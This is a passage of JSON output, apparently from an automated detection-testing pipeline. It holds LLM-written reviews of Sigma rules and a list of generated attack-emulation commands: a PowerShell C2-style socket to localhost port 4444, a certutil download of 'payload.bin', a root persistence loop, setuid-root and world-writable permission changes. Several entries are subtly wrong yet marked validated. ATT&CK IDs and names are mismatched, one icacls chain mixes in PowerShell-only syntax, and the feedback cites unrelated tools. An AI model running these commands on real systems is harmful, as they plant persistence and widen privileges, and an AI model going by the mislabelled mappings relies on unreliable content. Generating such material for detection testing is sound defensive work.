          "Limited to only three binaries; other input\u2011capture utilities (e.g., PowerShell ISE, certutil, reg.exe) are not covered.",
          "ATT&CK identifiers are missing or marked as \"unknown\", making mapping to the framework less precise.",
          "Metadata such as author, creation date, version, or proper ATT&CK technique ID are absent.",
          "No enrichment fields (e.g., user, command\u2011line arguments) to aid triage."
        ],
        "suggestions": [
          "Add additional command\u2011line patterns or binaries associated with input capture (e.g., PowerShell ISE, certutil, reg.exe, clipboard utilities).",
          "Refine the parent\u2011process exclusion logic by allowing known legitimate automation tools (e.g., SCCM, Ansible) while still flagging suspicious usage.",
          "Incorporate ATT&CK technique IDs (e.g., T1056.001 for Keylogging, T1056.004 for Clipboard Capture) to improve mapping and reporting.",
          "Include richer context fields such as the full command line, user account, and hash of the executable to aid investigation.",
          "Document rule author, creation/modification dates, and version number for better governance and change tracking.",
          "Consider adding a threshold or rate\u2011limiting component to suppress bursts of legitimate activity (e.g., scheduled task creation by IT)."
        ],
        "metrics": {
          "accuracy": 0.9,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Abuse of Command-Line Tools for Application Layer C2",
        "rule_id": "unknown",
        "quality_score": 0.78,
        "status": "pass",
        "strengths": [
          "Covers multiple commonly abused command\u2011line utilities (PowerShell, WMIC, schtasks, bitsadmin).",
          "Includes a generic selection that catches URLs and encoded PowerShell commands, widening coverage.",
          "Uses a parent\u2011process exclusion to reduce obvious benign launches (explorer.exe, cmd.exe).",
          "Verified in the SIEM with 58 matching events and a fast query time (~388\u202fms).",
          "Clear documentation: description, false\u2011positive notes, MITRE tags, and verification metadata."
        ],
        "weaknesses": [
          "Potential for false positives from legitimate admin scripts, scheduled\u2011task creation tools, and BITS updates \u2013 the exclusion list is limited.",
          "Parent\u2011process allowlist only covers explorer.exe and cmd.exe; many benign launchers (e.g., taskeng.exe, msiexec.exe, automation agents) are not excluded.",
          "Generic selection relies on plain\u2011text substrings (\"http://\", \"https://\", \"-enc\"); encoded or obfuscated commands may bypass detection.",
          "No explicit handling of PowerShell base64\u2011encoded commands beyond the \"-enc\" flag, which attackers often use.",
          "Rule does not incorporate any time\u2011window or rate\u2011limiting logic, which could increase alert fatigue in high\u2011volume environments."
        ],
        "suggestions": [
          "Expand the parent\u2011process allowlist to include other known benign launchers (taskeng.exe, msiexec.exe, automation agents, SCCM, etc.).",
          "Add detection for PowerShell \"-EncodedCommand\" with base64 decoding to catch hidden URLs or payloads.",
          "Consider using regex or Sigma's \"contains|all\" operator to match both \"http://\" and \"https://\" without relying on exact substrings.",
          "Introduce a rate\u2011limit or threshold (e.g., X matches per host per hour) to suppress noisy alerts from legitimate administrative activity.",
          "Correlate process creation events with network logs (e.g., outbound connections to suspicious domains) to improve confidence and reduce false positives.",
          "Document any known benign use\u2011cases within the environment and create an allowlist for those specific command\u2011line patterns."
        ],
        "metrics": {
          "accuracy": 0.9,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Process Injection via Suspicious Command-Line Tools",
        "rule_id": "unknown",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "Detects known injection\u2011related command\u2011line utilities (wmic, schtasks, bitsadmin, _pthread_create).",
          "Excludes common legitimate shells (cmd.exe, powershell.exe, explorer.exe) to reduce obvious noise.",
          "Includes a documented false\u2011positive list that acknowledges legitimate usage scenarios.",
          "Real\u2011world verification shows successful detection (60 events) with a fast query time (277\u202fms).",
          "Uses standard Sigma fields (title, description, logsource, detection, tags, level)."
        ],
        "weaknesses": [
          "Exclusion list is limited; many legitimate parent processes (e.g., taskeng.exe, mmc.exe, deployment tools) are not covered, leading to potential false positives.",
          "String\u2011contains matching may trigger on benign commands that merely reference the keywords (e.g., scripts that echo \"wmic\" for logging).",
          "Missing optional metadata such as author, creation date, rule ID, and references to ATT&CK technique IDs beyond the generic tag.",
          "No handling for obfuscated or encoded command lines that could hide the keywords.",
          "The rule does not consider process\u2011tree context beyond the immediate parent, which could improve precision."
        ],
        "suggestions": [
          "Expand the benign_parent list to include additional legitimate parent processes (taskeng.exe, mmc.exe, deployment agents, etc.).",
          "Refine the command\u2011line matching to use word boundaries or regex patterns to avoid partial matches (e.g., \"\\bwmic\\b\").",
          "Add a secondary condition that checks for known injection\u2011related arguments or flags (e.g., \"-Command\", \"-EncodedCommand\").",
          "Include optional metadata fields (author, date, rule ID, references) to improve rule management and traceability.",
          "Consider incorporating process\u2011tree analysis to verify that the child process is actually performing injection (e.g., checking for DLL loading events).",
          "Document and test the rule against a broader set of benign activity to quantify the false\u2011positive rate more accurately."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Obfuscated Files or Information via Command-Line Tools",
        "rule_id": "unknown",
        "quality_score": 0.775,
        "status": "pass",
        "strengths": [
          "Detects common obfuscation patterns such as PowerShell -EncodedCommand and encoded bitsadmin transfers.",
          "Covers multiple command\u2011line utilities (PowerShell, cmd, wmic, schtasks, bitsadmin) increasing breadth.",
          "Implements parent process exclusion to reduce obvious false positives.",
          "Verification data shows the rule successfully triggered on real events (71 matches).",
          "Provides an explicit false\u2011positive description list for analysts.",
          "Uses Sysmon process_creation logs, which are reliable and low\u2011volume."
        ],
        "weaknesses": [
          "Detection is limited to a few hard\u2011coded string patterns; other obfuscation techniques (e.g., base64 strings without -EncodedCommand, PowerShell -e, JScript, or custom encoders) are not covered.",
          "Parent\u2011process exclusion may inadvertently suppress legitimate malicious activity launched from allowed parents (e.g., scheduled tasks started by services.exe).",
          "The \"contains\" operator can match benign usage (e.g., legitimate admin scripts that include the word \"transfer\"), leading to potential false positives.",
          "No regex or length checks to verify that the encoded payload is suspicious (e.g., unusually long Base64 strings).",
          "Rule generation method is listed as \"langchain\" without any peer review, which may affect reliability.",
          "No explicit handling of variations in PowerShell syntax (e.g., \"-enc\", \"-EncodedCommand\", spaces, quotes)."
        ],
        "suggestions": [
          "Add regex patterns to detect Base64 strings of a minimum length (e.g., >100 characters) within the CommandLine field.",
          "Include additional PowerShell obfuscation indicators such as \"-e\", \"-EncodedCommand\", \"-Command\" with encoded payloads, and variations with quotes.",
          "Consider using a whitelist of known legitimate scripts or scheduled tasks to further reduce false positives.",
          "Refine parent_exclude logic to allow exceptions for known malicious parent\u2011child relationships (e.g., bitsadmin launched by a suspicious service).",
          "Incorporate entropy or character\u2011set analysis on the encoded payload to flag unusually random data.",
          "Validate the rule against a baseline of normal enterprise activity to quantify the actual false\u2011positive rate and adjust thresholds accordingly.",
          "Document the rule creation and review process to replace the generic \"langchain\" generation note with a peer\u2011reviewed provenance."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration Over C2 Channel via Command-Line Utilities",
        "rule_id": "unknown",
        "quality_score": 0.75,
        "status": "pass",
        "strengths": [
          "Detects several common command\u2011line utilities (PowerShell, WMIC, schtasks, bitsadmin) that attackers use for exfiltration.",
          "Uses a parent\u2011process exclusion (cmd.exe) to reduce noise from typical administrative scripts.",
          "Includes an explicit false\u2011positive list, showing awareness of legitimate use cases.",
          "Real\u2011world verification shows the rule successfully identified 66 events with a fast query time (~578\u202fms).",
          "All core Sigma fields (title, description, logsource, detection, falsepositives, level, tags, technique mapping) are present."
        ],
        "weaknesses": [
          "Only looks for a limited set of command\u2011line arguments; attackers can evade by using alternative flags or omitting them.",
          "Excludes only cmd.exe as a parent process \u2013 legitimate PowerShell or WMIC parent processes are not filtered, potentially increasing false positives.",
          "BITS transfers are common for Windows Update; the rule may generate alerts for normal system activity.",
          "No correlation with network activity (e.g., outbound connections) that would strengthen exfiltration detection.",
          "Rule generation method is listed as \"langchain\" \u2013 may indicate limited peer review or testing.",
          "Missing optional but useful Sigma metadata such as \"id\", \"author\", and \"date\" for version control."
        ],
        "suggestions": [
          "Add additional parent\u2011process whitelists (e.g., powershell.exe, wmic.exe, svchost.exe) to further reduce benign alerts.",
          "Expand the command\u2011line keyword list to include other exfiltration\u2011related switches (e.g., \"-FromBase64String\", \"-EncodedCommand\", \"-OutFile\").",
          "Combine process detection with network\u2011connection fields (e.g., DestinationIp, DestinationPort) to confirm data is being sent out.",
          "Implement a threshold on the number of matched keywords or on the size of transferred data to prioritize high\u2011risk events.",
          "Include a MITRE ATT&CK technique ID (e.g., T1041) in a dedicated \"mitre_attack_id\" field for better integration with threat\u2011modeling tools.",
          "Add versioning metadata (id, author, date) and document testing across multiple environments to improve maintainability."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Obfuscated Strings Execution via Common Windows Utilities",
        "rule_id": "unknown",
        "quality_score": 0.725,
        "status": "pass",
        "strengths": [
          "Covers a broad set of Windows utilities commonly abused for obfuscated execution (PowerShell, WMIC, schtasks, bitsadmin).",
          "Includes a parent\u2011process filter to reduce noise from cmd.exe\u2011launched scripts.",
          "Verification result shows the rule successfully detected 62 events, confirming functional detection.",
          "Well\u2011documented fields: clear title, description, false\u2011positive guidance, tags, and technique mapping.",
          "Uses Sysmon process\u2011creation logs, which provide rich context for detection."
        ],
        "weaknesses": [
          "The generic \"CommandLine|contains: base64\" selector is overly broad and will fire on many legitimate base64\u2011encoded data processing tasks, increasing false positives.",
          "Parent\u2011process exclusion only checks for cmd.exe; legitimate malicious executions launched from PowerShell, wscript, or scheduled tasks may be missed.",
          "No length or pattern checks for the encoded command; short base64 strings or benign flags could trigger the rule.",
          "The rule does not differentiate between short, typical PowerShell -enc strings and long, suspicious payloads.",
          "No explicit whitelisting of known administrative scripts or deployment tools that legitimately use -EncodedCommand."
        ],
        "suggestions": [
          "Refine the generic base64 selector by adding a minimum length requirement (e.g., >100 characters) or a regex that matches typical base64 payload patterns.",
          "Extend the parent\u2011process filter to include common legitimate launchers (powershell.exe, wscript.exe) and add a whitelist of known benign scripts or scheduled\u2011task names.",
          "Add regex patterns for PowerShell encoded commands that capture the typical base64 payload format (e.g., \"-EncodedCommand\\s+[A-Za-z0-9+/=]{100,}\").",
          "Consider incorporating additional indicators such as suspicious PowerShell flags (-nop, -w hidden, -ExecutionPolicy Bypass) to improve specificity.",
          "Document and implement a mitigation/response field to guide analysts on triage steps when the rule fires.",
          "Test the rule against a baseline of normal enterprise activity to quantify the actual false\u2011positive rate and adjust thresholds accordingly."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation of Public-Facing Application via Suspicious Command Execution",
        "rule_id": "unknown",
        "quality_score": 0.775,
        "status": "pass",
        "strengths": [
          "Verification in the SIEM succeeded with 64 matching events, demonstrating that the rule can detect the intended technique.",
          "Clear focus on high\u2011risk command\u2011line utilities (PowerShell, cmd, wmic, schtasks, bitsadmin) that are commonly abused in exploitation scenarios.",
          "Simple, efficient query logic (OR + NOT) resulting in a fast execution time (~1\u202fs).",
          "Explicit false\u2011positive documentation helps analysts understand expected noise.",
          "Appropriate MITRE ATT&CK tagging and level assignment."
        ],
        "weaknesses": [
          "Only one legitimate parent process (explorer.exe) is excluded; many benign executions originate from other parents (taskeng.exe, services.exe, remote admin tools), increasing false positives.",
          "The PowerShell detection relies solely on the \"-enc\" flag, missing other suspicious PowerShell usage (e.g., \"-EncodedCommand\", \"-Command\", or base64 strings without the flag).",
          "No correlation with network activity or inbound requests that would more directly indicate exploitation of a public\u2011facing application.",
          "The rule does not consider command\u2011line arguments for wmic, schtasks, or bitsadmin that could further refine malicious use.",
          "Generation method listed as \"langchain\" suggests the rule may have been auto\u2011generated without manual review, raising the risk of subtle logic errors."
        ],
        "suggestions": [
          "Expand the \"legit_parent\" exclusion list to include other common administrative parents such as taskeng.exe, services.exe, svchost.exe, and known remote\u2011management tools.",
          "Enrich the PowerShell detection to capture base64 payloads even when the \"-enc\" flag is omitted, and consider looking for suspicious patterns like \"IEX\" or \"Invoke\u2011Expression\".",
          "Add argument\u2011level filters for wmic, schtasks, and bitsadmin (e.g., look for creation of scheduled tasks with unusual names or remote file downloads).",
          "Correlate process creation events with recent inbound connections to the public\u2011facing service (e.g., matching source IPs or ports) to tighten the link to exploitation.",
          "Implement a tiered alerting approach: raise a low\u2011severity alert for any of the utilities, and a high\u2011severity alert when combined with a non\u2011standard parent or network indicator.",
          "Periodically review and tune the rule against baseline data to quantify the actual false\u2011positive rate and adjust exclusions accordingly."
        ],
        "metrics": {
          "accuracy": 0.9,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Archive Collected Data via Compression Utilities",
        "rule_id": "unknown",
        "quality_score": 0.775,
        "status": "pass",
        "strengths": [
          "Targets the core compression utilities (PowerShell Compress-Archive, zip, 7z, tar) directly linked to the Archive Collected Data technique.",
          "Includes parent\u2011process exclusions to reduce noise from typical user\u2011initiated compression via Explorer or cmd.exe.",
          "Verified against real SIEM data \u2013 63 matching events were found, confirming functional detection.",
          "Simple, readable Sigma syntax that is easy to maintain and adapt.",
          "Uses Sysmon process_creation events, which provide reliable process metadata."
        ],
        "weaknesses": [
          "Only matches a limited set of executables; it misses other ways to create archives (e.g., PowerShell's native .NET zip APIs, WSL tar, built\u2011in Windows zip via Explorer DLLs).",
          "The allowed_parent logic may suppress alerts when a malicious compression command is launched from an allowed parent (e.g., cmd.exe), potentially missing true positives.",
          "Potential for false positives from legitimate administrative or backup scripts that invoke the listed utilities, especially when parent exclusion does not apply.",
          "No enrichment with additional context such as archive file paths, sizes, or destination locations that could help triage.",
          "The rule does not consider variations in command\u2011line syntax (e.g., different quoting, use of PowerShell -EncodedCommand)."
        ],
        "suggestions": [
          "Add detections for PowerShell's native compression via System.IO.Compression.ZipFile and related .NET calls.",
          "Include monitoring of archive creation through Windows API calls or Explorer shell extensions (e.g., zipfldr.dll).",
          "Refine the parent\u2011process exclusions: use a whitelist approach for known benign processes rather than a blanket exclusion that may hide malicious activity.",
          "Incorporate additional fields such as the output archive path, file size, or destination network share to provide richer context for analysts.",
          "Expand the command\u2011line matching to cover common variations (e.g., \"Compress-Archive -Path\" without spaces, PowerShell -EncodedCommand, or use of short\u2011hand flags).",
          "Implement a baseline of normal compression activity per host and trigger alerts on anomalous frequency or volume.",
          "Add MITRE ATT&CK technique IDs for both T1560.001 (Archive via Utility) and T1560.002 (Archive via Library) to improve mapping.",
          "Test the rule against a larger, diverse dataset to fine\u2011tune false\u2011positive thresholds and confirm coverage of less common compression tools."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Screen Capture Tool Execution Detection",
        "rule_id": "unknown",
        "quality_score": 0.725,
        "status": "pass",
        "strengths": [
          "Detects a variety of native Windows utilities that can be used for screen capture.",
          "Includes parent\u2011process exclusions to reduce obvious false positives from command shells and services.",
          "Verification data shows the rule successfully matched events (84 hits) with a fast query time (~400\u202fms).",
          "Clear description, MITRE ATT&CK tag (attack.t1113) and appropriate severity level (high).",
          "Structured Sigma format that can be directly imported into supported SIEMs."
        ],
        "weaknesses": [
          "Potentially high false\u2011positive volume from legitimate use of Snipping Tool, Paint, PowerShell scripts, WMIC, SCHTASKS and BITSADMIN.",
          "The \"selection_nircmd\" condition incorrectly matches \"cmd.exe\" instead of the actual nircmd executable, reducing detection accuracy.",
          "The rule focuses only on built\u2011in Windows tools and misses popular third\u2011party screenshot utilities (e.g., Greenshot, ShareX, Snagit).",
          "The double\u2011negative \"not not_parent_cmd\" is confusing and may be mis\u2011interpreted by some parsers.",
          "Some selections (e.g., bitsadmin with \"download\") are not directly related to screen capture, leading to unnecessary matches.",
          "Metadata fields such as \"author\", \"date\", \"version\" and a proper MITRE technique ID are missing.",
          "No explicit handling for PowerShell\u2019s Add\u2011Type or .NET calls that can capture the screen without using the listed command\u2011line flags."
        ],
        "suggestions": [
          "Correct the nircmd selection to reference \"nircmd.exe\" (e.g., Image|endswith \"\\\\nircmd.exe\") and refine its command\u2011line pattern.",
          "Add detections for common third\u2011party screen\u2011capture tools and for PowerShell/.NET APIs that capture the screen (e.g., \"Add-Type -AssemblyName System.Drawing\").",
          "Replace the double\u2011negative parent exclusion with a single positive exclusion (e.g., \"not_parent_cmd\": { \"ParentImage|endswith\": \"\\\\cmd.exe\" }).",
          "Tighten the bitsadmin, wmic and schtasks selections to include more specific arguments that indicate screenshot activity rather than generic usage.",
          "Include additional context fields (e.g., User, SessionId) to help differentiate legitimate admin activity from malicious use.",
          "Populate missing metadata (author, creation date, version, proper MITRE technique ID) to improve rule provenance and maintainability.",
          "Consider adding a threshold or rate\u2011limiting component (e.g., multiple screenshot tool executions within a short window) to further lower false positives."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      }
    ],
    "feedback": {
      "timestamp": "2025-12-20T15:26:55.936103",
      "source_agent": "6df80dbd-0798-4fa6-8998-41abda47630c",
      "target_agent": "rulegen",
      "average_quality_score": 0.694,
      "total_rules_evaluated": 27,
      "improvements_needed": [
        {
          "metric": "quality",
          "current_value": 0.6944444444444444,
          "target_value": 0.85,
          "suggestion": "Improve overall rule quality"
        }
      ],
      "common_issues": [
        "Potential false positives from legitimate administrative scripts that legitimately use wmic, schtasks, or bitsadmin.",
        "The rule failed to detect any real-world events (0/0), indicating poor detection coverage in practice",
        "Relies solely on CommandLine monitoring, which can be easily bypassed via obfuscation or alternative execution methods",
        "The TTP ID is listed as 'unknown' and tactic is missing, reducing traceability to MITRE ATT&CK framework",
        "Rule may not account for all variants of command invocation (e.g., full paths, script wrappers)"
      ],
      "actionable_suggestions": [
        "Improve detection coverage by incorporating additional telemetry sources such as syscall monitoring (e.g., auditd or eBPF) instead of relying only on process command line",
        "Enhance the rule with process ancestry or parent-child context to distinguish malicious use from legitimate tools like tmux or screen",
        "Update the rule with proper MITRE ATT&CK mapping by researching and filling in the correct TTP ID and tactic",
        "Add normalization for command variations (e.g., /usr/bin/grantpt, ./grantpt) using regex or multiple selection conditions",
        "Conduct further testing in a controlled environment to validate detection capability and tune the rule accordingly"
      ]
    }
  },
  "attacks": [
    {
      "id": "07134903-57bd-4f89-86d0-e4a8bc55fa19",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Pseudo-Terminal",
      "tactic": "execution",
      "platform": "linux",
      "command": "script -q -c \"id\" /dev/null",
      "description": "Uses the `script` utility to spawn a pseudo\u2011terminal (PTY) and execute the `id` command, which internally calls `grantpt`/`posix_openpt` to allocate the PTY.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command prints the current user and group IDs to stdout and then exits. A PTY is created and destroyed during execution, but no persistent changes are made to the system.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:13.206172",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3a36093d-b7ed-46ff-8beb-579ad6cb2411",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Pseudo-Terminal",
      "tactic": "execution",
      "platform": "linux",
      "command": "socat -d -d PTY,link=/tmp/pty0,raw,echo=0 STDOUT",
      "description": "Creates a new pseudo\u2011terminal device using `socat`. The PTY is linked to `/tmp/pty0` and attached to the current stdout, demonstrating a direct PTY allocation via `posix_openpt`.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "`socat` allocates a PTY, prints debug information to stderr, and then waits for input. The PTY remains active until the process is terminated (e.g., with Ctrl\u2011C). No files are written or modified beyond the temporary PTY link.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:13.206172",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6b57d675-6d3c-416e-8a3c-aa19cb9f8ab5",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Pseudo-Terminal",
      "tactic": "execution",
      "platform": "linux",
      "command": "ssh -tt localhost \"whoami\"",
      "description": "Forces PTY allocation with the `-tt` flag of `ssh` when connecting to the local SSH server, causing the client to request a pseudo\u2011terminal from the server.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command establishes an SSH connection to the local host, allocates a PTY, runs `whoami` on the remote side, and prints the resulting username. The PTY is released after the command finishes.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:13.206172",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3d6a225f-ce87-4e76-83db-76d967d5e3d8",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Network Communication",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$client = New-Object System.Net.Sockets.TcpClient('127.0.0.1',4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine('test'); $writer.Flush(); $reader = New-Object System.IO.StreamReader($stream); $response = $reader.ReadLine(); Write-Host $response; $client.Close()\"",
      "description": "Creates a TCP client that connects to 127.0.0.1:4444, sends the string 'test', reads a single line response, and prints it. Demonstrates socket send/receive activity typical of C2 communication.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A TCP connection is opened to the localhost listener on port 4444, the payload 'test' is transmitted, the remote side's reply (if any) is displayed, and the socket is cleanly closed.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:14.444984",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9812aae3-9eee-4678-843b-e07df74b68e0",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Network Communication",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$req = [System.Net.WebRequest]::Create('http://127.0.0.1:8080'); $resp = $req.GetResponse(); $stream = $resp.GetResponseStream(); $reader = New-Object System.IO.StreamReader($stream); $data = $reader.ReadToEnd(); Write-Host $data; $resp.Close()\"",
      "description": "Performs an HTTP GET request to a local web server, reads the full response body, and outputs it. Uses .NET WebRequest which results in socket receive activity.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command contacts http://127.0.0.1:8080, receives the HTTP response content, prints it to the console, and then closes the connection.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:14.445323",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "49c9b9f6-85ba-41bd-b004-b588a0a60b50",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Network Communication",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -split -f http://127.0.0.1/payload.bin %TEMP%\\payload.bin",
      "description": "Downloads a file from a local HTTP server using certutil, storing it in the temporary directory. certutil uses socket receive operations under the hood.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file 'payload.bin' is retrieved from the specified URL and written to %TEMP%\\payload.bin. No execution of the payload occurs; the file is simply saved.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:14.445323",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "dd223b63-47ed-4882-b98f-1d32b4244f3f",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "linux",
      "command": "/bin/sh -c 'echo \"Test execution\" > /tmp/test.txt'",
      "description": "Executes a simple echo command using the explicit /bin/sh interpreter and writes output to a temporary file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates /tmp/test.txt containing the string \"Test execution\".",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:15.365335",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9f31c5a2-474c-47ab-bb97-845e8f25b3f2",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "linux",
      "command": "sudo nohup /bin/sh -c 'while true; do echo \"heartbeat\" >> /SpectralBlur/.macshare/heartbeat.log; sleep 60; done' >/dev/null 2>&1 &",
      "description": "Starts a background persistence loop using /bin/sh that appends a timestamped \"heartbeat\" entry to a log file inside the malicious SpectralBlur/.macshare directory every minute.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A long\u2011running background process is created that writes a line to /SpectralBlur/.macshare/heartbeat.log every 60 seconds. The process continues until manually stopped.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:15.366570",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b1c49510-a2f3-40a5-b9b3-7565c3b9d756",
      "ttp_id": "unknown",
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification",
      "tactic": "execution",
      "platform": "windows",
      "command": "icacls \"C:\\Temp\\test.txt\" /grant \"*S-1-1-0\":F",
      "description": "Basic example \u2013 grants the Everyone group full control (F) on a benign test file using the built\u2011in icacls utility.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The ACL of C:\\Temp\\test.txt is modified so that all users have full read/write/execute permissions.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:16.431289",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c57fec32-ea2d-4607-b4f4-6ef4e7af0177",
      "ttp_id": "unknown",
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"\\$path = 'C:\\Temp\\DemoFolder'; if (-not (Test-Path \\$path)) { New-Item -ItemType Directory -Path \\$path -Force }; \\$acl = Get-Acl \\$path; \\$rule = New-Object System.Security.AccessControl.FileSystemAccessRule('DOMAIN\\\\TestUser','Modify','ContainerInherit,ObjectInherit','None','Allow'); \\$acl.SetAccessRule(\\$rule); Set-Acl -Path \\$path -AclObject \\$acl\"",
      "description": "Intermediate example \u2013 creates a folder (if missing) and adds a Modify permission for a specific domain user using PowerShell\u2019s Set\u2011Acl cmdlet.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new directory C:\\Temp\\DemoFolder is created (if it does not exist) and the user DOMAIN\\TestUser receives Modify rights on that folder and its contents.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:16.431289",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3ccf1905-af3b-4295-a337-59586394e936",
      "ttp_id": "unknown",
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification",
      "tactic": "execution",
      "platform": "windows",
      "command": "icacls \"C:\\SensitiveData\" /save \"C:\\Temp\\acl_backup.txt\" && icacls \"C:\\SensitiveData\" /inheritance:r && icacls \"C:\\SensitiveData\" /grant \"Administrators\":(OI)(CI)F && icacls \"C:\\SensitiveData\" /remove \"Users\" && icacls \"C:\\SensitiveData\" /restore \"C:\\Temp\\acl_backup.txt\" -ErrorAction SilentlyContinue",
      "description": "Advanced example \u2013 backs up the current ACLs of a sensitive directory, disables inheritance, grants Administrators full control with object and container inheritance, removes the Users group, then restores the original ACLs from the backup. Demonstrates full lifecycle of permission modification.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The original ACLs of C:\\SensitiveData are saved, inheritance is turned off, Administrators receive full control, Users are stripped of permissions, and finally the original ACLs are restored from the backup file.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:16.431289",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d833a3eb-96fd-45b3-8da4-735d256ff4e3",
      "ttp_id": "unknown",
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification",
      "tactic": "execution",
      "platform": "linux",
      "command": "chmod 777 /tmp/malicious.sh",
      "description": "Sets read, write, and execute permissions for all users on a test script located in /tmp, demonstrating basic permission modification without requiring elevated privileges.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file /tmp/malicious.sh becomes world\u2011readable, writable, and executable.",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:17.180770",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "443f765f-e620-4322-a6c2-0a523d02fa55",
      "ttp_id": "unknown",
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification",
      "tactic": "execution",
      "platform": "linux",
      "command": "sudo chmod 4755 /usr/local/bin/hidden_script",
      "description": "Changes the file mode to setuid root (4755) on a benign script, allowing it to execute with elevated privileges when run by any user.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "When any user runs /usr/local/bin/hidden_script, the process runs with effective UID 0 (root).",
      "source": "langchain",
      "generated_at": "2025-12-20T15:11:17.180770",
      "agent_id": "c93b278b-1db8-4f54-890d-dccb7952f6d5",
      "confidence_score": 0.8,
      "validated": true
    },
